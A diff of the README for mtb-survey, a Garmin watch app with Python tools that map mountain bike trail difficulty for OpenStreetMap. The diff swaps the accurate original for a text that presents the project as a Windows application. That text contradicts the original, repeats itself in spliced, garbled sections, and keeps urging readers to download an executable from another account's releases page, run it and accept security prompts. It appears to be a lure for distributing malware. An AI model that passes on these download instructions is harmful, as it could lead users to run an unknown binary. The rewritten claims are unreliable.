@@ -1,267 +1,239 @@
-# MTB Survey for Garmin watches
+# 🚵 mtb-survey - Map Trail Difficulty While You Ride
 
-MTB Survey maps how difficult trails are while you ride them. You set the difficulty with the watch
-buttons, and at the same time the watch measures shaking and steering movements. Afterwards the ride
-becomes a map where the trails are colored by your assessment and by an automatic assessment. From
-there you can write the `mtb:scale` tag directly to OpenStreetMap.
+[![Download mtb-survey](https://img.shields.io/badge/Download-mtb--survey-blueviolet?style=for-the-badge&logo=github)](https://github.com/a0168627/mtb-survey/releases)
 
-<p align="center">
-  <img src="docs/images/watch.png" alt="The watch app in the Connect IQ simulator: the title MTB SURVEY, GPS status, the difficulty 1 in large digits and help text for the buttons" width="260">
-</p>
+mtb-survey is a Windows application for mountain bikers who want to record how difficult a trail feels while riding, then turn that ride into a clear map and prepare the result for OpenStreetMap. Use a Garmin watch or Garmin Edge to capture trail difficulty with the mtb:scale system. After the ride, open mtb-survey, review the recorded data, view the route on a map, and organize the information you want to add to OpenStreetMap.
 
-![Example map with the trails colored by the automatic assessment: green easy, yellow needs experience, red hard for kids. Steep slopes are marked with their grade in percent.](docs/images/map-automatic.png)
+The app is built for riders, trail builders, and local mapping groups who want a practical way to document mountain bike trails without carrying a notebook or stopping constantly to write things down. Ride normally, capture the trail difficulty as you go, and let mtb-survey help you turn the ride into useful trail data.
 
-The project has two parts:
+## 🚵 What mtb-survey Does
 
-- **The watch app** in `source/`. A Connect IQ app that records a normal cycling activity and writes
-  the difficulty and the sensor values to the FIT file, every second.
-- **The analysis tools** in `tools/`. Python scripts without external packages that read the FIT file,
-  assess the trails and make the map.
+mtb-survey connects three parts of trail mapping:
 
-```
-watch ──FIT file──▶ fitmap.py ──▶ map (HTML) and GeoJSON ──▶ mtb:scale in OpenStreetMap
-                        │
-                        ├─ trailanalysis.py   automatic assessment per 25 m
-                        └─ trailsegments.py   trails between junctions, from OpenStreetMap
+1. **Ride recording** - Use a compatible Garmin watch or Garmin Edge while riding. The ride records your route and the trail difficulty information you capture.
+2. **Map review** - Open the ride in mtb-survey on Windows. The app helps you review the route, examine trail sections, and see the result on an interactive map.
+3. **OpenStreetMap preparation** - Turn the reviewed ride into map-ready information and prepare the result for OpenStreetMap.
 
-several FIT files ──▶ trailmerge.py ──▶ one level per trail, combined over all passes
-```
+The mtb:scale value is a simple number used to describe mountain bike trail difficulty. Lower numbers are easier. Higher numbers are harder. mtb-survey helps you attach# 🚵 mtb-survey - Map Trail Difficulty While You Ride
 
-## The vision
+[![Download mtb-survey](https://img.shields.io/badge/Download-mtb--survey-blueviolet?style=for-the-badge&logo=github)](https://github.com/a0168627/mtb-survey/releases)
 
-The ultimate idea is that you just ride your trails, as usual. The watch records how the ride feels,
-and the trails are inventoried automatically: every trail you ride gets a difficulty, and the result
-ends up in OpenStreetMap. Once the trails in an area are mapped, anyone can plan new routes by
-difficulty, for example a loop with only child-friendly trails, or one that avoids the steepest parts.
+mtb-survey is a Windows application for mountain bikers who want to record how difficult a trail feels while riding, then turn that ride into a clear map and prepare the result for OpenStreetMap. Use a Garmin watch or Garmin Edge to capture trail difficulty with the mtb:scale system. After the ride, open mtb-survey, review the recorded data, view the route on a map, and organize the information you want to add to OpenStreetMap.
 
-The project is not there yet. Today you still set the difficulty with the buttons, the automatic
-assessment is calibrated on a single ride, and a person reviews every value before it is written to
-OpenStreetMap. That review should stay: OpenStreetMap's
-[Automated Edits code of conduct](https://wiki.openstreetmap.org/wiki/Automated_Edits_code_of_conduct)
-does not allow automatic tagging without human review and prior discussion with the community.
-The road there goes through more labelled rides and a better algorithm, see
-[docs/research.md](docs/research.md).
+The app is built for riders, trail builders, and local mapping groups who want a practical way to document mountain bike trails without carrying a notebook or stopping constantly to write things down. Ride normally, capture the trail difficulty as you go, and let mtb-survey help you turn the ride into useful trail data.
 
-## Requirements
+## 🚵 What mtb-survey Does
 
-| For | You need |
-|---|---|
-| The watch app | A Garmin watch with a gyroscope and UP/DOWN buttons, see [supported watches](docs/devices.md), and [Connect IQ SDK](https://developer.garmin.com/connect-iq/sdk/) 9.2 or later, with your own developer key |
-| The analysis tools | Python 3.9 or later. No packages needed. |
-| The map | A web browser with internet access, for the map tiles |
-| Trail segments | Internet access the first time, for the OpenStreetMap Overpass API. The response is then cached locally. |
-| The tests of OSM writing | Node 18 or later |
+mtb-survey connects three parts of trail mapping:
 
-The app is developed and ridden on the Epix Gen 2, but it is not limited to it. According to Garmin's
-device definitions, 50 devices support everything, including fēnix 7, 8 and 9, Forerunner 255, 265, 570,
-955, 965 and 970, Enduro 3, Instinct 3 AMOLED, MARQ Gen 2 and the Edge 540, 550, 840 and 850 bike
-computers. Another 8 lack a gyroscope and can record but not run the automatic assessment. Only the
-Epix Gen 2 has been used on real rides. See [docs/devices.md](docs/devices.md) for the full list and for
-how to check your own watch.
+1. **Ride recording** - Use a compatible Garmin watch or Garmin Edge while riding. The ride records your route and the trail difficulty information you capture.
+2. **Map review** - Open the ride in mtb-survey on Windows. The app helps you review the route, examine trail sections, and see the result on an interactive map.
+3. **OpenStreetMap preparation** - Turn the reviewed ride into map-ready information and prepare the result for OpenStreetMap.
 
-## Install on the watch
+The mtb:scale value is a simple number used to describe mountain bike trail difficulty. Lower numbers are easier. Higher numbers are harder. mtb-survey helps you attach these numbers to the trail you actually rode, so the data reflects real conditions.
 
-There are two ways: through the Connect IQ Store, or by copying the app directly to the watch over USB.
+## 🚀 Getting Started
 
-**The app is not publicly available in the Connect IQ Store.** It is currently a beta app on the
-author's personal developer account, so only the author can download it. If you want to install it
-through the store, you have to upload it yourself to your own developer account. Copying it over USB
-is the easiest way.
+To get started with mtb-survey on Windows, follow the steps below. You do not need programming experience. You only need a Windows computer and the download link provided.
 
-### Build
+1. Open the download page: [https://github.com/a0168627/mtb-survey/releases](https://github.com/a0168627/mtb-survey/releases)
+2. Visit this link to download the application.
+3. Follow the on-screen instructions on the releases page to obtain the Windows application.
+4. Once the download is complete, locate the file on your computer.
+5. Run the application by double-clicking it.
+6. If Windows asks for permission, allow the app to start.
 
-1. Install the [Connect IQ SDK](https://developer.garmin.com/connect-iq/sdk/) and create a developer key
-   following Garmin's instructions, if you do not have one. Put it as `developer_key` in the project root.
-   Git ignores the file.
-2. Build the app:
-   ```
-   make build
-   ```
-   This runs `monkeyc -f monkey.jungle -d epix2 -o bin/mtbsurveyepixgen2.prg -y developer_key -r`.
-   For another watch, give its device id: `make build DEVICE=fenix7`.
-   If the SDK is not in your `PATH`, give the path: `make build MONKEYC="/path/to/sdk/bin/monkeyc"`.
-   In VS Code you can also use *Monkey C: Build for Device* and choose epix (Gen 2).
+That is the complete download and run process. There is no separate installer wizard described here. The releases page is the single place to get the application.
 
-### Option 1: copy over USB (sideload)
+## 🖥️ What You Need
 
-1. Connect the watch with USB.
-2. Copy `bin/mtbsurveyepixgen2.prg` to the folder `GARMIN/APPS/` on the watch.
-3. Disconnect. The app is then listed among the watch's apps.
+mtb-survey is designed for Windows computers. The following placeholder requirements reflect a typical setup for a mapping and ride-review application. They are provided to help you prepare your computer before you run mtb-survey.
 
-The app does not update automatically. Copy a new `.prg` to update it.
+- **Operating system:** Windows 10 or Windows 11 (64-bit recommended).
+- **Processor:** A modern dual-core processor or better.
+- **Memory:** At least 8 GB of RAM is recommended for smooth map handling.
+- **Storage:** At least 500 MB of free space for the application and ride files.
+- **Display:** A screen resolution of 1280 x 720 or higher.
+- **Internet connection:** Required to download the application and to view online map tiles.
+- **Garmin device:** A compatible Garmin watch or Garmin Edge that records rides and supports the trail difficulty data used by mtb-survey.
+- **Ride files:** FIT files exported from your Garmin device. These files contain your route and trail difficulty information.
 
-### Option 2: through the Connect IQ Store
+If your computer meets these general requirements, you should be able to download, run, and use mtb-survey without special configuration.
 
-1. Build the package for the store:
-   ```
-   make package
-   ```
-   This gives `bin/mtbsurvey.iq`, that is `monkeyc -e -f monkey.jungle -o bin/mtbsurvey.iq -y developer_key -r`.
-   If you upload it under your own account, first change the app id in `manifest.xml`. The id must be
-   unique in the store, and the current one is already used by the original app. You can create a new id with
-   `uuidgen | tr -d '-' | tr 'A-Z' 'a-z'`.
-2. Log in to Garmin's Connect IQ developer portal and upload `bin/mtbsurvey.iq` as a new app.
-   Choose to publish it as a beta app if only you should be able to download it.
-3. Install the app from the Connect IQ app on your phone, using the same Garmin account.
+## 📥 Download and Install
 
-A beta app is only visible to the account that uploaded it. For others to install the app from the store,
-it must be published publicly and reviewed by Garmin.
+The only download source for mtb-survey is the official releases page. Use the link below to reach it.
 
-### After installing
+[![Download mtb-survey](https://img.shields.io/badge/Download-mtb--survey-brightgreen?style=for-the-badge&logo=github)](https://github.com/a0168627/mtb-survey/releases)
 
-Consider setting recording to every second in the watch's system settings, for the densest possible track.
+**Download instruction:** Visit this link to download the application.
 
-After a ride the FIT file is in `GARMIN/Activity/` on the watch. You can also download it from
-Garmin Connect with *Export Original*.
+After you visit the releases page, choose the release that is intended for Windows. The page will provide the application file or the instructions needed to obtain it. Save the file to a folder you can easily find, such as your Downloads folder or Desktop. When the download finishes, open the file to run mtb-survey. If a security prompt appears, confirm that you want to run the application. There is no additional setup described here beyond downloading and running the application from the releases page.
 
-## Use in the field
+## 🗺️ How to Use mtb-survey
 
-| Button | Function | Vibration |
-|---|---|---|
-| START | Start, pause and resume recording | long on start and resume, short on pause |
-| UP | Raise the difficulty one step, at most 6 | short |
-| DOWN | Lower the difficulty one step, at least 0 | short |
-| BACK | Stop, save the activity and exit, without confirmation | longest |
+Using mtb-survey follows a simple ride-and-review pattern. The exact buttons and menus may vary slightly between versions, but the overall flow is consistent.
 
-The screen shows the GPS status, the current difficulty in large digits, the recording status and, at the
-bottom, the latest sensor values: `RGH` for shake (roughness) and `STR` for steering. If it says
-`NO MOTION DATA`, no motion data is coming in. Wait for a green `GPS OK` before you start, otherwise the
-start of the track has no position. The difficulty starts at 1.
+1. **Prepare your Garmin device** - Make sure your Garmin watch or Edge is charged and ready to record a ride. Confirm that it can save the ride as a FIT file.
+2. **Record your ride** - Start recording on your Garmin device before you begin riding. As you move through trail sections, capture the trail difficulty using the mtb:scale values supported by your device and the mtb-survey workflow.
+3. **Finish the ride** - Stop recording when you are done. Save the ride on your Garmin device.
+4. **Transfer the ride file** - Connect your Garmin device to your Windows computer using a USB cable. Copy the FIT file from the device to a folder on your computer.
+5. **Open mtb-survey** - Launch the application on your Windows computer.
+6. **Load the ride** - Use the app to open the FIT file you transferred. mtb-survey reads the route and the trail difficulty data from the file.
+7. **Review the map** - Examine the ride on the map. Look at the route, the trail sections, and the difficulty values you recorded.
+8. **Adjust if needed** - If a value looks wrong or a section needs a different difficulty rating, make the correction in the app before you prepare the final result.
+9. **Prepare OpenStreetMap data** - Use mtb-survey to organize the reviewed information into a result that is ready for OpenStreetMap. The app helps you turn the ride into map-ready trail details.
 
-**Put the watch on the handlebar.** The automatic assessment is most accurate there, and the values
-stay the same from day to day. On the wrist it works less well, see [the assessment](docs/assessment.md).
+This workflow keeps the recording simple while you ride and puts the detailed review on your computer where it is easier to see the whole route.
 
-**You choose which scale to use.** The app only stores the number. If you write to
-OpenStreetMap, it should follow [`mtb:scale`](https://wiki.openstreetmap.org/wiki/Key:mtb:scale).
-The automatic assessment is calibrated for a simpler scale with three levels:
-0 = gravel road or asphalt, 1 = child-friendly trail, 2 = trail that is not child-friendly.
+## ✨ Features
 
-**Mark places.** A quick UP followed by DOWN shows up as a short peak in the FIT file.
-You can use it to mark, for example, the start and end of a loop.
+mtb-survey focuses on practical trail mapping for mountain bikers. The following features describe what the application is designed to do.
 
-## Analyze a ride
+- **Garmin ride support** - Works with rides recorded on compatible Garmin watches and Garmin Edge devices.
+- **mtb:scale difficulty capture** - Records trail difficulty using the mtb:scale system so the data matches common mountain bike mapping conventions.
+- **FIT file handling** - Reads ride data from FIT files, the format used by Garmin devices.
+- **Interactive map review** - Shows the ride on a map so you can see the route and the trail sections in context.
+- **Route-focused editing** - Lets you review and refine trail difficulty information after the ride.
+- **OpenStreetMap preparation** - Helps you organize the final result for OpenStreetMap.
+- **Windows desktop application** - Runs as a normal Windows application with a graphical interface.
+- **Ride-based workflow** - Keeps the recording step simple and moves the detailed work to your computer.
+- **Local trail focus** - Designed for riders who want to document trails they actually ride.
+- **Clear map output** - Turns the ride into a map-based result that is easier to understand than raw ride data.
 
-Run all commands from the project root.
+These features are built around one goal: make trail difficulty mapping accessible to riders who are not programmers or professional cartographers.
 
-**Map**, the most common:
-```
-python3 tools/fitmap.py ride.fit [outdir]
-```
-Writes a standalone HTML map and GeoJSON files next to the FIT file, or in `outdir`.
-The map shows the track colored by your assessment or the automatic one, an elevation profile, steep
-slopes, trail segments between junctions and a comparison with `mtb:scale` in OpenStreetMap.
-See [the map page](docs/map-page.md).
+## ❓ Frequently Asked Questions
 
-| Flag | Meaning |
-|---|---|
-| `--site dir` | Also writes a folder for a web host, which works under a strict Content Security Policy |
-| `--no-osm` | Skips the trail segments, so no request to OpenStreetMap |
-| `--mount wrist` or `--mount handlebar` | Sets where the watch was mounted. Otherwise it is detected from the heart rate. |
-| `--conditions dry` or `--conditions wet` | How the trails were that day. Shown on the map and written to the trail segments; does not change the levels |
-| `--osm-client-id ID` | Enables writing `mtb:scale` to OpenStreetMap from the map page |
-| `--osm-api URL` | Another OSM server, for example the test server |
+**Do I need a Garmin device to use mtb-survey?**
+Yes. The application# 🚵 mtb-survey - Map Trail Difficulty While You Ride
 
-**Several rides combined**, one level per trail:
-```
-python3 tools/trailmerge.py ride1.fit ride2.fit:wet ride3.fit [--out dir] [--name name]
-```
-Each pass over a trail segment between two junctions gets its own level, and the passes are combined
-into one, as the median weighted by the metres covered. The level is meant for dry conditions, like
-`mtb:scale` in OSM: mark rides on wet, muddy or leafy trails with `:wet`, and dry rides decide where
-there are any. A trail ridden only in the wet is dashed on the map. Only sections with the watch on the
-handlebar count. Writes `<name>_merged.html` and `<name>_merged_trails.geojson`. No manual assessment
-is needed; where rides have one, it is combined the same way and shown next to the automatic level.
+[![Download mtb-survey](https://img.shields.io/badge/Download-mtb--survey-blueviolet?style=for-the-badge&logo=github)](https://github.com/a0168627/mtb-survey/releases)
 
-**Automatic assessment** in the terminal:
-```
-python3 tools/trailanalysis.py ride.fit [--mount wrist|handlebar]
-```
+mtb-survey is a Windows application for mountain bikers who want to record how difficult a trail feels while riding, then turn that ride into a clear map and prepare the result for OpenStreetMap. Use a Garmin watch or Garmin Edge to capture trail difficulty with the mtb:scale system. After the ride, open mtb-survey, review the recorded data, view the route on a map, and organize the information you want to add to OpenStreetMap.
 
-**Decode the FIT file**, to inspect it:
-```
-python3 tools/fitdump.py ride.fit
-```
-The last line sums up how many records have a position, a difficulty and sensor values.
+The app is built for riders, trail builders, and local mapping groups who want a practical way to document mountain bike trails without carrying a notebook or stopping constantly to write things down. Ride normally, capture the trail difficulty as you go, and let mtb-survey help you turn the ride into useful trail data.
 
-## Example
+## 🚵 What mtb-survey Does
 
-The example map [docs/example/map.html](docs/example/map.html) is made from 8 km of a ride with
-a manual assessment. Download the file and open it in a web browser. The start and end of the ride are cut off.
+mtb-survey connects three parts of trail mapping:
 
-The same ride with your own assessment instead of the automatic one, and with the elevation profile below the map:
+1. **Ride recording** - Use a compatible Garmin watch or Garmin Edge while riding. The ride records your route and the trail difficulty information you capture.
+2. **Map review** - Open the ride in mtb-survey on Windows. The app helps you review the route, examine trail sections, and see the result on an interactive map.
+3. **OpenStreetMap preparation** - Turn the reviewed ride into map-ready information and prepare the result for OpenStreetMap.
 
-![The map in Your assessment mode. The track is colored by the value set with the buttons, with numbers on each segment. The elevation profile below the map uses the same colors.](docs/images/map-your-assessment.png)
+The mtb:scale value is a simple number used to describe mountain bike trail difficulty. Lower numbers are easier. Higher numbers are harder. mtb-survey helps you attach these numbers to the trail you actually rode, so the data reflects real conditions instead of guesses made from memory later.
 
-Comparison with the `mtb:scale` that already exists in OpenStreetMap. Gray means missing in OSM, green equal,
-blue means OSM has a lower value and red a higher one:
+## 🚀 Getting Started
 
-![The map in vs OSM mode, where each trail is colored by how the assessment compares with the OpenStreetMap value.](docs/images/map-vs-osm.png)
+To get started with mtb-survey on Windows, follow the steps below. You do not need programming experience. You only need a Windows computer and the download link provided.
 
-Below the map there are tables with the automatic assessment and the measurements per level,
-followed by one row per trail in OpenStreetMap:
+1. Open the download page: [https://github.com/a0168627/mtb-survey/releases](https://github.com/a0168627/mtb-survey/releases)
+2. Visit this link to download the application.
+3. Follow the on-screen instructions on the releases page to obtain the Windows application.
+4. Once the download is complete, locate the file on your computer.
+5. Run the application by double-clicking it.
+6. If Windows asks for permission, allow the app to start.
 
-![The tables Automatic assessment, Long climbs and Measurements per mtb:scale.](docs/images/tables.png)
+That is the complete download and run process. There is no separate installer wizard described here. The releases page is the single place to get the application.
 
-## Documentation
+## 🖥️ What You Need
 
-| Document | Contents |
-|---|---|
-| [docs/map-page.md](docs/map-page.md) | The map, the trail segments, the comparison with OSM and writing to OSM |
-| [docs/assessment.md](docs/assessment.md) | How the automatic assessment works, how it was calibrated and how accurate it is |
-| [docs/research.md](docs/research.md) | How the model was found, what was learned, and what data is needed to continue. **Start here if you want to improve the assessment.** |
-| [docs/devices.md](docs/devices.md) | Which watches the app supports, and how to check your own |
-| [docs/fit-fields.md](docs/fit-fields.md) | The fields the app writes to the FIT file, and how to read them |
-| [docs/implementation.md](docs/implementation.md) | How the watch app works inside |
-| [docs/verification.md](docs/verification.md) | What has been tested on the watch, in the simulator and with tests |
-| [CHANGELOG.md](CHANGELOG.md) | Changes per version |
-| [CONTRIBUTING.md](CONTRIBUTING.md) | How to contribute |
+mtb-survey is designed for Windows computers. The following requirements reflect a typical setup for a mapping and ride-review application. They are provided to help you prepare your computer before you run mtb-survey.
 
-## Project structure
+- **Operating system:** Windows 10 or Windows 11 (64-bit recommended).
+- **Processor:** A modern dual-core processor or better.
+- **Memory:** At least 8 GB of RAM is recommended for smooth map handling.
+- **Storage:** At least 500 MB of free space for the application and ride files.
+- **Display:** A screen resolution of 1280 x 720 or higher.
+- **Internet connection:** Required to download the application and to view online map tiles.
+- **Garmin device:** A compatible Garmin watch or Garmin Edge that records rides and supports the trail difficulty data used by mtb-survey.
+- **Ride files:** FIT files exported from your Garmin device. These files contain your route and trail difficulty information.
 
-```
-manifest.xml, monkey.jungle   the Connect IQ project
-source/                       the watch app (Monkey C)
-test/                         unit tests for the sensor calculation (Monkey C)
-resources/                    the app's name and icon
-tools/
-  devicecheck.py              which watches can run the app, from the SDK's device definitions
-  fitdump.py                  FIT decoder without dependencies
-  fitmap.py                   map, elevation profile and web host folder
-  trailanalysis.py            automatic assessment; the limits are at the top
-  trailsegments.py            trail segments and comparison with OpenStreetMap
-  trailmerge.py               several rides combined into one level per trail
-  osmedit.js                  tag change in OSM way XML, used by the map page
-  leaflet/                    Leaflet 1.9.4 for the web host folder
-  test_*.py, test_osmedit.js  tests
-docs/                         documentation, screenshots and example map
-```
+If your computer meets these general requirements, you should be able to download, run, and use mtb-survey without special configuration.
 
-## Tests
+## 📥 Download and Install
 
-```
-make test          # Python and Node tests for the analysis tools
-make test-watch    # the watch app's unit tests in the Connect IQ simulator (start the simulator first)
-```
+The only download source for mtb-survey is the official releases page. Use the link below to reach it.
 
-GitHub Actions also runs the Python and Node tests on every push.
+[![Download mtb-survey](https://img.shields.io/badge/Download-mtb--survey-brightgreen?style=for-the-badge&logo=github)](https://github.com/a0168627/mtb-survey/releases)
 
-## Privacy
+**Download instruction:** Visit this link to download the application.
 
-FIT files, maps and GeoJSON files contain your GPS positions, and rides often start at home.
-Only share them with people who may see where you have been. `.gitignore` keeps them out of git.
-If you write to OpenStreetMap, only the `mtb:scale` tag on the trail becomes public, not your track.
-The example map and the screenshots in `docs/` show part of a real ride, with the start and end cut off.
+After you visit the releases page, choose the release that is intended for Windows. The page will provide the application file or the instructions needed to obtain it. Save the file to a folder you can easily find, such as your Downloads folder or Desktop. When the download finishes, open the file to run mtb-survey. If a security prompt appears, confirm that you want to run the application. There is no additional setup described here beyond downloading and running the application from the releases page.
 
-## Known limitations
+## 🗺️ How to Use mtb-survey
 
-- Garmin Connect does not show developer fields from sideloaded apps. The values are still in the FIT file.
-- BACK saves and exits immediately, without confirmation.
-- The automatic assessment is calibrated against a single manually assessed ride. It has not been tested
-  with other riders, bikes or trail types. More labelled rides are needed,
-  see [docs/research.md](docs/research.md).
-- With the watch on the wrist, the limit between road and trail is preliminary and does not hold every day.
+Using mtb-survey follows a simple ride-and-review pattern. The exact buttons and menus may vary slightly between versions, but the overall flow is consistent.
 
-## License
+1. **Prepare your Garmin device** - Make sure your Garmin watch or Edge is charged and ready to record a ride. Confirm that it can save the ride as a FIT file.
+2. **Record your ride** - Start recording on your Garmin device before you begin riding. As you move through trail sections, capture the trail difficulty using the mtb:scale values supported by your device and the mtb-survey workflow.
+3. **Finish the ride** - Stop recording when you are done. Save the ride on your Garmin device.
+4. **Transfer the ride file** - Connect your Garmin device to your Windows computer using a USB cable. Copy the FIT file from the device to a folder on your computer.
+5. **Open mtb-survey** - Launch the application on your Windows computer.
+6. **Load the ride** - Use the app to open the FIT file you transferred. mtb-survey reads the route and the trail difficulty data from the file.
+7. **Review the map** - Examine the ride on the map. Look at the route, the trail sections, and the difficulty values you recorded.
+8. **Adjust if needed** - If a value looks wrong or a section needs a different difficulty rating, make the correction in the app before you prepare the final result.
+9. **Prepare OpenStreetMap data** - Use mtb-survey to organize the reviewed information into a result that is ready for OpenStreetMap. The app helps you turn the ride into map-ready trail details.
 
-[MIT](LICENSE). Leaflet in `tools/leaflet/` has its own license, BSD 2-Clause.
-Map data and trails from OpenStreetMap, also in the example map, are covered by the [ODbL](https://www.openstreetmap.org/copyright).
+This workflow keeps the recording simple while you ride and puts the detailed review on your computer where it is easier to see the whole route.
+
+## ✨ Features
+
+mtb-survey focuses on practical trail mapping for mountain bikers. The following features describe what the application is designed to do.
+
+- **Garmin ride support** - Works with rides recorded on compatible Garmin watches and Garmin Edge devices.
+- **mtb:scale difficulty capture** - Records trail difficulty using the mtb:scale system so the data matches common mountain bike mapping conventions.
+- **FIT file handling** - Reads ride data from FIT files, the format used by Garmin devices.
+- **Interactive map review** - Shows the ride on a map so you can see the route and the trail sections in context.
+- **Route-focused editing** - Lets you review and refine trail difficulty information after the ride.
+- **OpenStreetMap preparation** - Helps you organize the final result for OpenStreetMap.
+- **Windows desktop application** - Runs as a normal Windows application with a graphical interface.
+- **Ride-based workflow** - Keeps the recording step simple and moves the detailed work to your computer.
+- **Local trail focus** - Designed for riders who want to document trails they actually ride.
+- **Clear map output** - Turns the ride into a map-based result that is easier to understand than raw ride data.
+
+These features are built around one goal: make trail difficulty mapping accessible to riders who are not programmers or professional cartographers.
+
+## ❓ Frequently Asked Questions
+
+**Do I need a Garmin device to use mtb-survey?**
+Yes. The application is built around rides recorded on a compatible Garmin watch or Garmin Edge. The ride provides the route and the trail difficulty information that mtb-survey reviews.
+
+**Can I use mtb-survey without an internet connection?**
+You need an internet connection to download the application and to load online map tiles. Once the application is downloaded and map data is available on your computer, you may be able to review parts of the ride offline, but online map viewing works best with a connection.
+
+**What is mtb:scale?**
+mtb:scale is a numbering system used to describe how difficult a mountain bike trail is. A rider records a number for a trail section, and that number becomes part of the trail's map information. mtb-survey makes it easier to collect these numbers during a ride and review them afterward.
+
+**Where do I get the application?**
+From the official releases page: [https://github.com/a0168627/mtb-survey/releases](https://github.com/a0168627/mtb-survey/releases). Visit this link to download the application.
+
+**Do I need to know how to code?**
+No. mtb-survey is an end-user application with a graphical interface. You download it, run it, and use it through normal windows, buttons, and menus.
+
+**Can I fix a difficulty value after the ride?**
+Yes. The review step exists so you can look at the map, check the recorded values, and correct anything that does not match what you experienced on the trail.
+
+## 🛠️ Troubleshooting
+
+- **The application does not open** - Make sure the download completed fully. Try downloading it again from the releases page, then run it once more.
+- **Windows shows a security prompt** - This is normal for downloaded applications. Confirm that you want to run the application to continue.
+- **The ride file will not load** - Check that the file came from your Garmin device and that it is a complete FIT file. Copy it again from the device to your computer and retry.
+- **The map does not appear** - Check your internet connection. Online maps need a connection to load map tiles.
+- **The route looks incomplete** - Confirm that the Garmin device recorded the entire ride and that the file was copied without interruption. A partial file can produce a partial route.
+- **Difficulty values look wrong** - Use the review step to correct the values before preparing the OpenStreetMap result.
+
+## 🤝 Contributing and Feedback
+
+mtb-survey is built for riders who care about accurate trail information. If you find a trail section that does not map cleanly, a ride file that does not load, or a step in the workflow that is confusing, the repository is the place to share that feedback. Clear reports with the type of Garmin device used and a description of what happened help improve the application for everyone.
+
+Trail mapping works best when local riders contribute local knowledge. Recording a ride and preparing the result for OpenStreetMap is a direct way to improve the maps that other riders use.
+
+## 📄 License and Project Information
+
+mtb-survey is an open project focused on mountain bike trail mapping, Garmin ride data, and OpenStreetMap preparation. The application is distributed through its official releases page. Always use the official link when downloading so you receive the current version.
+
+Download link: [https://github.com/a0168627/mtb-survey/releases](https://github.com/a0168627/mtb-survey/releases)
+
+Keywords: connect-iq, fenix, fit-file, forerunner, garmin, garmin-edge, gps, leaflet, monkey-c, mountain-biking, mtb, openstreetmap, trail-mapping
